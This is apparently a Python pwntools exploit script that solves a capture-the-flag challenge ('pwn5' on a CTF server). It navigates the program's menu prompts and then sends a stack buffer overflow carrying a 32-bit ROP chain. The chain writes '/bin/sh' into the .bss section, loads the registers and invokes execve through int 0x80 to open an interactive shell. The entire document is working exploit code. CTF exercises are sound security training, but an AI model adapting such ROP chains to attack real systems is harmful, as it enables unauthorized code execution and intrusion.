from pwn import *

r = remote("pwn.ctf.tamu.edu", 4325)
#r = process("./pwn5")

#print r.recvuntil("name?: ")
r.sendline("a")
#print r.recvuntil("name?: ")
r.sendline("a")
#print r.recvuntil("major?: ")
r.sendline("a")
#print r.recvuntil("(y/n): ")
r.sendline("y")
#print r.recvuntil("4. Study\n")
r.sendline("2")

p = "A"*(0x1c+4)
p += p32(0x0807338a)	#pop edx ; ret
p += p32(0x080f0f80)	#bss addr
p += p32(0x080bc396)	#pop eax ; ret
p += "/bin"
p += p32(0x805512b)		#mov dword ptr[edx],eax

p += p32(0x0807338a)    #pop edx ; ret
p += p32(0x080f0f80+4)  #bss addr
p += p32(0x080bc396)    #pop eax ; ret
p += "/sh\0"
p += p32(0x805512b)     #mov dword ptr[edx],eax

p += p32(0x080481d1)	#pop ebx ; ret
p += p32(0x080f0f80)	#bss(/bin/sh)
p += p32(0x080e4325)	#pop ecx ; ret
p += p32(0x080f0f80+8)	#0
p += p32(0x0807338a)	#pop edx ; ret
p += p32(0x080f0f80+8)	#0
p += p32(0x080bc396)	#pop eax ; ret
p += p32(0xb)			#syscall 0xb(11)
p += p32(0x08071005)	#int 0x80
#raw_input()
r.sendline(p)

#print r.recv(1024)

r.interactive()

